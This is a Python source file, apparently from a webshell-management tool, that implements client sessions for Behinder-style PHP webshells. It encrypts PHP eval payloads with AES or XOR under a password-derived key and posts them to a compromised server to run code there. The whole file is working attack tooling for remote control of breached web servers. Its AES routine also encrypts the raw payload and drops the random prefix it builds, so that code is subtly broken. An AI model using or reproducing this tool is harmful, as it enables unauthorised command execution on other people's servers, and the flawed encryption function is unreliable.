import typing as t
import hashlib
import logging
import random
import base64

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    get_http_client,
)
from ..core.php_session_common import (
    PHPWebshellActions,
    PHPWebshellCommunication,
    php_webshell_action_options,
    php_webshell_communication_options,
)

logger = logging.getLogger("core.sessions.php_behinder")


def md5_encode(s):
    """将给定的字符串或字节序列转换成MD5"""
    if isinstance(s, str):
        s = s.encode()
    return hashlib.md5(s).hexdigest()


def base64_encode(s):
    """将给定的字符串或字节序列编码成base64"""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


# 为了保证前16个字符不相同，我们需要在payload前方加入随机字符串


def behinder_aes(payload: t.Union[str, bytes], key: bytes):
    """将给定的payload按照冰蝎的格式进行AES加密"""
    pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
    payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)
    iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    payload_padded = pad(payload, AES.block_size)
    return base64_encode(cipher.encrypt(payload_padded))


def behinder_xor(payload: t.Union[str, bytes], key: bytes):
    """将给定的payload按照冰蝎的格式进行Xor加密"""
    pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
    payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)
    payload_xor = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload_bytes)])
    return base64_encode(payload_xor)


@register_session
class PHPWebshellBehinderAES(PHPWebshellCommunication, PHPWebshellActions):
    session_type = "BEHINDER_PHP_AES"
    readable_name = "冰蝎AES"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="timeout_refresh_client",
                    name="超时更换HTTP Session",
                    type="checkbox",
                    placeholder="一直使用相同的PHPSESSID可能会导致前一个长时间操作阻塞接下来的操作",
                    default_value=True,
                    alternatives=None,
                ),
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_communication_options
            + php_webshell_action_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(session_conn)
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)

    async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
        # 冰蝎会错误处理符号`|`，需要做一次base64编码避免出现`|`
        return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")

    async def submit_http(self, payload: t.Union[str, bytes]):
        data = behinder_aes(payload, self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
            # 此时服务端会为这个session id等待这个长时间操作
            # 所以我们再使用这个session id发起请求就会卡住
            # 所以我们要丢掉这个session id，使用另一个client发出请求
            if self.timeout_refresh_client:
                logger.warning("HTTP请求受控端超时，尝试刷新HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "发送HTTP请求到受控端失败：" + str(exc)
            ) from exc


@register_session
class PHPWebshellBehinderXor(PHPWebshellCommunication, PHPWebshellActions):
    session_type = "BEHINDER_PHP_XOR"
    readable_name = "冰蝎XOR"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="timeout_refresh_client",
                    name="超时更换HTTP Session",
                    type="checkbox",
                    placeholder="一直使用相同的PHPSESSID可能会导致前一个长时间操作阻塞接下来的操作",
                    default_value=True,
                    alternatives=None,
                ),
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_communication_options
            + php_webshell_action_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(session_conn)
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)

    async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
        # 冰蝎会错误处理符号`|`，需要做一次base64编码避免出现`|`
        return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")

    async def submit_http(self, payload: t.Union[str, bytes]):
        data = behinder_xor(payload, self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
            # 此时服务端会为这个session id等待这个长时间操作
            # 所以我们再使用这个session id发起请求就会卡住
            # 所以我们要丢掉这个session id，使用另一个client发出请求
            if self.timeout_refresh_client:
                logger.warning("HTTP请求受控端超时，尝试刷新HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "发送HTTP请求到受控端失败：" + str(exc)
            ) from exc
